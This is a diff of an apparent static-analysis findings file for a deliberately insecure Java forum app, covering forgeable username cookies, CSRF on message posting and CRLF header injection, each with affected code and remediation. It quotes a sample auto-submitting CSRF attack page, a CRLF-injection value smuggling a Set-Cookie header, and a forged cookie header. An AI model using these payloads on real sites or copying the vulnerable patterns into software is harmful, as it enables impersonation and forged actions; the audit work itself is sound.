+            "text": "In <code>AuthenticationController.setCookie()</code>, the authenticated user's identity is stored as the raw username string inside a plain HTTP cookie with no server-side session binding, no HMAC signature, and no integrity protection:<pre>Cookie cookie = new Cookie(\"user\", username);</pre><code>AuthenticationFilter</code> then grants access to protected routes simply by checking whether a cookie named <code>user</code> *exists* (it does not even validate its value against any server-side session or token store). Any attacker can forge authentication by issuing a request with a manually crafted <code>Cookie: user=****</code> header, completely bypassing the login step. The attacker's chosen username is also used verbatim as the <code>author</code> field when posting messages (<code>@CookieValue(value = \"user\") String user</code> in <code>MessageController</code>), enabling full identity spoofing.<h3>Affected Code</h3><code>src/main/java/com/example/insecureforum/web/AuthenticationController.java</code><pre>51&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eraseCookie(request, response);\n52&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return new RedirectView(\"/\", true);\n53&nbsp;|&nbsp;}\n54&nbsp;|&nbsp;\n55&nbsp;|&nbsp;private void setCookie(HttpServletRequest request, HttpServletResponse response, String username) {\n56&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Cookie cookie = new Cookie(\"user\", username);\n57&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cookie.setPath(\"/\");\n58&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cookie.setMaxAge(-1);\n59&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;response.addCookie(cookie);\n60&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;request.setAttribute(\"loggedIn\", true);\n61&nbsp;|&nbsp;}</pre><h3>Remediation</h3>Replace the cookie-as-identity pattern with a proper server-side session:\n1. On successful login, create an <code>HttpSession</code> and store the authenticated username in it: <code>request.getSession(true).setAttribute(\"user\", username)</code>.\n2. Issue only an opaque, server-generated session ID cookie (handled automatically by the servlet container).\n3. In <code>AuthenticationFilter</code>, validate identity by reading <code>session.getAttribute(\"user\")</code> rather than a cookie value.\n4. On logout, invalidate the session: <code>session.invalidate()</code>.\n\nAlternatively, use Spring Security's full authentication framework.",
+            "markdown": "In `AuthenticationController.setCookie()`, the authenticated user's identity is stored as the raw username string inside a plain HTTP cookie with no server-side session binding, no HMAC signature, and no integrity protection:\n\n```java\nCookie cookie = new Cookie(\"user\", username);\n```\n\n`AuthenticationFilter` then grants access to protected routes simply by checking whether a cookie named `user` *exists* (it does not even validate its value against any server-side session or token store). Any attacker can forge authentication by issuing a request with a manually crafted `Cookie: user=****` header, completely bypassing the login step. The attacker's chosen username is also used verbatim as the `author` field when posting messages (`@CookieValue(value = \"user\") String user` in `MessageController`), enabling full identity spoofing."
           },
           "locations": [
             {
@@ -644,83 +456,15 @@
             }
           ],
           "fingerprints": {
-            "fortify/instance-id": "C16EFEB281E73376CAD8F1CA01708359"
+            "fortify/instance-id": "F4949EB6E45ED4DB59CFBA52F1C4837B"
           },
           "properties": {
-            "impact": 5,
-            "likelihood": 5,
+            "impact": 4,
+            "likelihood": 4,
             "snippetStartLine": 51,
-            "summary": "Plain username stored as cookie value with no signing; any user can forge a cookie to impersonate any account including admin",
-            "remediationSummary": "Replace the plain username cookie with a server-side session (HttpSession) so session tokens cannot be trivially forged.",
-            "remediation": "\nReplace the ad-hoc cookie scheme with proper session management:\n\n1. On successful login, call `request.getSession(true)` (invalidating any existing session first with `request.getSession(false).invalidate()`) to obtain a container-managed, cryptographically random session ID that is stored server-side.\n2. Store the authenticated username in `session.setAttribute(\"authenticatedUser\", username)`.\n3. In the authentication filter, check `session.getAttribute(\"authenticatedUser\") != null` rather than cookie existence.\n4. Alternatively, integrate Spring Security, which provides all of this out-of-the-box.\n"
-          }
-        },
-        {
-          "ruleId": "cross-site-request-forgery",
-          "level": "error",
-          "message": {
-            "text": "The <code>composeSubmit()</code> POST endpoint at <code>/messages/compose</code> performs a state-changing operation (creates a new forum message attributed to the cookie user) with no CSRF protection:\n\n- <code>AuthenticationFilter</code> only checks for a cookie named <code>\"user\"</code> — it performs no origin or token check.\n- <code>MessageController.composeSubmit()</code> accepts <code>@RequestParam</code> values and calls <code>messageDao.post()</code> without validating a CSRF token.\n- <code>compose.jsp</code> renders the form without a hidden CSRF token field.\n\nAn attacker can host a page such as:<pre>&lt;form method=\"POST\" action=\"https://forum.example.com/messages/compose\"&gt;\n&nbsp;&nbsp;&lt;input name=\"subject\" value=\"Pwned\"&gt;\n&nbsp;&nbsp;&lt;input name=\"body\" value=\"Malicious content\"&gt;\n&lt;/form&gt;\n&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</pre>When a logged-in user visits this page, the browser automatically attaches the <code>user</code> cookie, and the forum posts the message on the victim's behalf without the victim's knowledge. The attacker can also inject content that is later rendered without HTML-encoding (see stored XSS), amplifying the impact.<h3>Affected Code</h3><code>src/main/java/com/example/insecureforum/web/MessageController.java</code><pre>37&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@RequestMapping(value = \"/messages/compose\", method = RequestMethod.POST)\n38&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public RedirectView composeSubmit(@CookieValue(value = \"user\", defaultValue = \"anonymous\") String user,\n39&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@RequestParam(\"subject\") String subject,\n40&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@RequestParam(\"body\") String body) {\n41&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;messageDao.post(user, subject, body);\n42&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return new RedirectView(\"./list\");\n43&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\n44&nbsp;|&nbsp;\n45&nbsp;|&nbsp;}</pre><h3>Remediation</h3>1. <strong>Spring Security (recommended):</strong> Add Spring Security to the project; it enables CSRF protection by default for all state-changing requests.\n2. <strong>Manual CSRF token:</strong> In the GET handler for <code>/messages/compose</code>, generate a cryptographically random token, store it in the HTTP session, and embed it as a hidden field in the form. Validate the token in <code>composeSubmit()</code> before processing the request.\n3. The <code>SameSite=Strict</code> or <code>SameSite=Lax</code> cookie attribute on the <code>user</code> cookie would also mitigate CSRF for modern browsers.",
-            "markdown": "The `composeSubmit()` POST endpoint at `/messages/compose` performs a state-changing operation (creates a new forum message attributed to the cookie user) with no CSRF protection:\n\n- `AuthenticationFilter` only checks for a cookie named `\"user\"` — it performs no origin or token check.\n- `MessageController.composeSubmit()` accepts `@RequestParam` values and calls `messageDao.post()` without validating a CSRF token.\n- `compose.jsp` renders the form without a hidden CSRF token field.\n\nAn attacker can host a page such as:\n```html\n<form method=\"POST\" action=\"https://forum.example.com/messages/compose\">\n  <input name=\"subject\" value=\"Pwned\">\n  <input name=\"body\" value=\"Malicious content\">\n</form>\n<script>document.forms[0].submit();</script>\n```\nWhen a logged-in user visits this page, the browser automatically attaches the `user` cookie, and the forum posts the message on the victim's behalf without the victim's knowledge. The attacker can also inject content that is later rendered without HTML-encoding (see stored XSS), amplifying the impact."
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "src/main/java/com/example/insecureforum/web/MessageController.java"
-                },
-                "region": {
-                  "startLine": 41,
-                  "snippet": {
-                    "text": "\n    @RequestMapping(value = \"/messages/compose\", method = RequestMethod.POST)\n    public RedirectView composeSubmit(@CookieValue(value = \"user\", defaultValue = \"anonymous\") String user,\n                                      @RequestParam(\"subject\") String subject,\n                                      @RequestParam(\"body\") String body) {\n        messageDao.post(user, subject, body);\n        return new RedirectView(\"./list\");\n    }\n\n}\n"
-                  }
-                }
-              }
-            }
-          ],
-          "fingerprints": {
-            "fortify/instance-id": "7DC6BA72AD2B75BE434C64B30FB35DC5"
-          },
-          "properties": {
-            "impact": 3,
-            "likelihood": 3.5,
-            "snippetStartLine": 36,
-            "summary": "POST /messages/compose has no CSRF token; any website can silently post messages as the logged-in user.",
-            "remediationSummary": "Add CSRF token validation to the compose POST endpoint — use Spring Security CSRF support or manually generate/validate a per-session token in a hidden form field.",
-            "remediation": "1. **Spring Security (recommended):** Add Spring Security to the project; it enables CSRF protection by default for all state-changing requests.\n2. **Manual CSRF token:** In the GET handler for `/messages/compose`, generate a cryptographically random token, store it in the HTTP session, and embed it as a hidden field in the form. Validate the token in `composeSubmit()` before processing the request.\n3. The `SameSite=Strict` or `SameSite=Lax` cookie attribute on the `user` cookie would also mitigate CSRF for modern browsers."
-          }
-        },
-        {
-          "ruleId": "header-manipulation",
-          "level": "error",
-          "message": {
-            "text": "In <code>AuthenticationController.loginSubmit()</code>, the user-supplied <code>username</code> POST parameter is concatenated without any sanitisation directly into a redirect URL:<pre>return new RedirectView(\"/auth/login?username=\" + username, true);</pre><code>RedirectView</code> eventually writes the URL into the HTTP <code>Location</code> response header. If <code>username</code> contains unencoded CRLF sequences (e.g., <code>%0d%0aSet-Cookie:%20session=attacker</code>), an attacker can inject arbitrary HTTP headers into the response. This enables:\n\n- <strong>Session fixation</strong> via injected <code>Set-Cookie</code> headers.\n- <strong>Cache poisoning</strong> by injecting a fake <code>Content-Type</code> or body delimiter.\n- <strong>XSS</strong> by injecting a crafted second HTTP response with a malicious body.\n\nAlthough modern versions of Tomcat strip literal CRLF from <code>sendRedirect</code>, the application itself performs no sanitisation, and the path remains vulnerable where servlet containers are less strictly hardened or when the <code>Location</code> header is constructed differently.<h3>Affected Code</h3><code>src/main/java/com/example/insecureforum/web/AuthenticationController.java</code><pre>40&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(userDao.authenticate(username, password)) {\n41&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setCookie(request, response, username);\n42&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return new RedirectView(\"/\", true);\n43&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {\n44&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eraseCookie(request, response);\n45&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return new RedirectView(\"/auth/login?username=\" + username, true);\n46&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\n47&nbsp;|&nbsp;}\n48&nbsp;|&nbsp;\n49&nbsp;|&nbsp;@RequestMapping(value = \"/auth/logout\", method = RequestMethod.GET)\n50&nbsp;|&nbsp;public RedirectView logout(HttpServletRequest request, HttpServletResponse response) {</pre><h3>Remediation</h3>URL-encode the username before embedding it in the redirect URL, and additionally strip any CR/LF characters defensively:<pre>String safeUsername = URLEncoder.encode(username, StandardCharsets.UTF_8);\nreturn new RedirectView(\"/auth/login?username=\" + safeUsername, true);</pre>This ensures the value is always treated as a URL query-parameter token and cannot inject additional header lines. Note that the separate XSS exposure in <code>login.jsp</code> (reflecting <code>${prefillUsername}</code> unescaped) should also be addressed.",
-            "markdown": "\nIn `AuthenticationController.loginSubmit()`, the user-supplied `username` POST parameter is concatenated without any sanitisation directly into a redirect URL:\n\n```java\nreturn new RedirectView(\"/auth/login?username=\" + username, true);\n```\n\n`RedirectView` eventually writes the URL into the HTTP `Location` response header. If `username` contains unencoded CRLF sequences (e.g., `%0d%0aSet-Cookie:%20session=attacker`), an attacker can inject arbitrary HTTP headers into the response. This enables:\n\n- **Session fixation** via injected `Set-Cookie` headers.\n- **Cache poisoning** by injecting a fake `Content-Type` or body delimiter.\n- **XSS** by injecting a crafted second HTTP response with a malicious body.\n\nAlthough modern versions of Tomcat strip literal CRLF from `sendRedirect`, the application itself performs no sanitisation, and the path remains vulnerable where servlet containers are less strictly hardened or when the `Location` header is constructed differently.\n"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "src/main/java/com/example/insecureforum/web/AuthenticationController.java"
-                },
-                "region": {
-                  "startLine": 45,
-                  "snippet": {
-                    "text": "        if(userDao.authenticate(username, password)) {\n            setCookie(request, response, username);\n            return new RedirectView(\"/\", true);\n        } else {\n            eraseCookie(request, response);\n            return new RedirectView(\"/auth/login?username=\" + username, true);\n        }\n    }\n\n    @RequestMapping(value = \"/auth/logout\", method = RequestMethod.GET)\n    public RedirectView logout(HttpServletRequest request, HttpServletResponse response) {"
-                  }
-                }
-              }
-            }
-          ],
-          "fingerprints": {
-            "fortify/instance-id": "242726A7F31D67596B18D9D6E55E1A6D"
-          },
-          "properties": {
-            "impact": 3,
-            "likelihood": 2,
-            "snippetStartLine": 40,
-            "summary": "User-supplied username concatenated unencoded into redirect URL, enabling CRLF injection and potential HTTP Response Splitting",
-            "remediationSummary": "URL-encode the username before concatenating it into the redirect Location header to prevent CRLF injection.",
-            "remediation": "\nURL-encode the username before embedding it in the redirect URL, and additionally strip any CR/LF characters defensively:\n\n```java\nString safeUsername = URLEncoder.encode(username, StandardCharsets.UTF_8);\nreturn new RedirectView(\"/auth/login?username=\" + safeUsername, true);\n```\n\nThis ensures the value is always treated as a URL query-parameter token and cannot inject additional header lines. Note that the separate XSS exposure in `login.jsp` (reflecting `${prefillUsername}` unescaped) should also be addressed.\n"
+            "summary": "The user's identity is stored as a plain, unsigned, forgeable username cookie with no server-side session, allowing any attacker to impersonate any user.",
+            "remediationSummary": "Replace the username-as-cookie identity pattern with a server-side HttpSession; store the authenticated username in the session and validate it there.",
+            "remediation": "Replace the cookie-as-identity pattern with a proper server-side session:\n1. On successful login, create an `HttpSession` and store the authenticated username in it: `request.getSession(true).setAttribute(\"user\", username)`.\n2. Issue only an opaque, server-generated session ID cookie (handled automatically by the servlet container).\n3. In `AuthenticationFilter`, validate identity by reading `session.getAttribute(\"user\")` rather than a cookie value.\n4. On logout, invalidate the session: `session.invalidate()`.\n\nAlternatively, use Spring Security's full authentication framework."
           }
         }
       ]
